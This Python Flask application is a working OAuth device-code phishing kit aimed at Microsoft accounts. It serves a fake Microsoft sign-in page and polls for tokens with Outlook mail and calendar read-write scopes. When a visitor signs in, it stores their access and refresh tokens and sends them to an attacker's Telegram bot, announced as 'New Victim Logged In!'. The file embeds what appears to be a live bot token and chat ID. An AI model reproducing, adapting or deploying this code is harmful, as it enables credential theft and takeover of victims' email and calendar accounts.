import os
import time
import uuid
import sqlite3
import threading
import requests
from flask import Flask, request, jsonify, make_response

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"

# Official Microsoft Office client ID (first-party, no unverified warning)
CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"

AUTH_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode"
TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"

SCOPE = ("https://outlook.office.com/Mail.ReadWrite "
         "https://outlook.office.com/Calendars.ReadWrite "
         "offline_access openid profile email")

app = Flask(__name__)

DB_NAME = os.environ.get("DB_PATH", "sessions.db")


# --- DATABASE ---
def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS sessions (
        sid TEXT PRIMARY KEY,
        device_code TEXT,
        user_code TEXT,
        verification_uri TEXT,
        status TEXT DEFAULT 'pending',
        access_token TEXT,
        refresh_token TEXT,
        id_token TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    conn.commit()
    conn.close()


def get_db():
    conn = sqlite3.connect(DB_NAME)
    conn.row_factory = sqlite3.Row
    return conn


def save_session(sid, device_code, user_code, verification_uri):
    conn = get_db()
    try:
        conn.execute(
            'INSERT OR REPLACE INTO sessions (sid, device_code, user_code, verification_uri, status) VALUES (?,?,?,?,?)',
            (sid, device_code, user_code, verification_uri, 'pending'))
        conn.commit()
    finally:
        conn.close()


def update_session_tokens(sid, data):
    conn = get_db()
    try:
        conn.execute('''UPDATE sessions SET status='completed',
            access_token=?, refresh_token=?, id_token=? WHERE sid=?''',
            (data.get('access_token'), data.get('refresh_token'),
             data.get('id_token'), sid))
        conn.commit()
    finally:
        conn.close()


def get_session(sid):
    conn = get_db()
    try:
        row = conn.execute('SELECT * FROM sessions WHERE sid=?', (sid,)).fetchone()
        return dict(row) if row else None
    finally:
        conn.close()


# --- TELEGRAM ---
def send_telegram(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        chunks = [text[i:i + 3900] for i in range(0, len(text), 3900)] or [text]
        for chunk in chunks:
            requests.post(url, json={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": chunk,
                "parse_mode": "HTML"
            }, timeout=15)
    except Exception as e:
        print(f"Telegram error: {e}")


# --- POLLING (survives restarts via DB) ---
def poll_for_token(sid, device_code):
    interval = 5
    deadline = time.time() + 900  # device codes expire in ~15 min
    while time.time() < deadline:
        time.sleep(interval)
        try:
            r = requests.post(TOKEN_URL, data={
                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                "client_id": CLIENT_ID,
                "device_code": device_code,
            }, timeout=15)
            data = r.json()
        except Exception as e:
            print(f"Poll exception {sid}: {e}")
            continue

        if "access_token" in data:
            update_session_tokens(sid, data)
            sess = get_session(sid)
            user_code = sess['user_code'] if sess else '?'
            msg = (f"🎯 <b>New Victim Logged In!</b>\n\n"
                   f"<b>Code:</b> <code>{user_code}</code>\n\n"
                   f"<b>Access Token:</b>\n<code>{data.get('access_token','')}</code>\n\n"
                   f"<b>Refresh Token:</b>\n<code>{data.get('refresh_token','')}</code>\n\n"
                   f"<b>ID Token:</b>\n<code>{data.get('id_token','')}</code>")
            send_telegram(msg)
            print(f"Success for {sid}")
            return
        elif data.get("error") == "authorization_pending":
            continue
        elif data.get("error") == "slow_down":
            interval += 5
            continue
        elif data.get("error") == "authorization_declined":
            print(f"Victim declined {sid}")
            return
        else:
            print(f"Poll error {sid}: {data}")
            return


# --- ROUTES ---
@app.route('/')
def index():
    sid = uuid.uuid4().hex[:12]

    try:
        r = requests.post(AUTH_URL, data={
            "client_id": CLIENT_ID,
            "scope": SCOPE,
        }, timeout=15)
        resp_data = r.json()
    except Exception as e:
        return f"Error contacting Microsoft: {e}", 500

    if "device_code" not in resp_data:
        # Show the actual Microsoft error so problems are visible, not silent
        return f"Microsoft error: {resp_data}", 500

    device_code = resp_data["device_code"]
    user_code = resp_data["user_code"]
    verification_uri = resp_data.get("verification_uri",
                                     "https://microsoft.com/devicelogin")

    save_session(sid, device_code, user_code, verification_uri)
    threading.Thread(target=poll_for_token, args=(sid, device_code), daemon=True).start()

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in to your account</title>
<style>
  body {{ font-family:'Segoe UI',Tahoma,sans-serif;background:#f2f2f2;display:flex;
          justify-content:center;align-items:center;min-height:100vh;margin:0; }}
  .container {{ background:#fff;padding:44px;width:440px;max-width:92vw;
                box-shadow:0 2px 6px rgba(0,0,0,.2); }}
  .logo img {{ height:24px; }}
  h1 {{ font-size:24px;font-weight:600;color:#1b1b1b;margin:16px 0 12px; }}
  p {{ font-size:15px;color:#1b1b1b;line-height:1.5;margin:0 0 16px; }}
  .code-box {{ background:#f0f0f0;padding:15px;font-size:26px;font-weight:600;
               letter-spacing:2px;text-align:center;border:1px solid #ccc;
               margin:20px 0;user-select:all; }}
  .btn {{ background:#0067b8;color:#fff;border:none;padding:12px 24px;
          font-size:15px;font-weight:600;cursor:pointer;width:100%; }}
  .btn:hover {{ background:#005da6; }}
  .footer {{ margin-top:24px;font-size:12px;color:#666;text-align:center; }}
</style>
</head>
<body>
<div class="container">
  <div class="logo">
    <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo.svg" alt="Microsoft">
  </div>
  <h1>Sign in</h1>
  <p>Enter the code shown below to sign in to Microsoft Office.</p>
  <div class="code-box" id="codeDisplay">{user_code}</div>
  <button class="btn" onclick="handleCopy()">Copy Code &amp; Continue</button>
  <div class="footer">© 2026 Microsoft. All rights reserved.</div>
</div>
<script>
function handleCopy() {{
  var code = document.getElementById('codeDisplay').innerText;
  var done = function() {{ window.location.href = "{verification_uri}"; }};
  if (navigator.clipboard && navigator.clipboard.writeText) {{
    navigator.clipboard.writeText(code).then(done).catch(done);
  }} else {{
    var ta = document.createElement('textarea');
    ta.value = code; document.body.appendChild(ta);
    ta.select(); document.execCommand('copy');
    document.body.removeChild(ta); done();
  }}
}}
</script>
</body>
</html>"""

    resp = make_response(html)
    resp.headers['Cache-Control'] = 'no-store'
    return resp


@app.route('/status')
def status():
    sid = request.args.get('sid')
    sess = get_session(sid) if sid else None
    if not sess:
        return jsonify({"status": "not_found"}), 404
    return jsonify({"status": sess['status']})


@app.route('/debug')
def debug():
    conn = get_db()
    try:
        rows = conn.execute(
            'SELECT sid, status, user_code, created_at FROM sessions ORDER BY created_at DESC LIMIT 10'
        ).fetchall()
        out = "<h1>Sessions</h1><table border='1' cellpadding='6'><tr><th>SID</th><th>Status</th><th>Code</th><th>Created</th></tr>"
        for row in rows:
            out += f"<tr><td>{row['sid']}</td><td>{row['status']}</td><td>{row['user_code']}</td><td>{row['created_at']}</td></tr>"
        return out + "</table>"
    finally:
        conn.close()


@app.route('/test-telegram')
def test_telegram():
    send_telegram("✅ Telegram is working!")
    return "Sent — check Telegram."


init_db()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
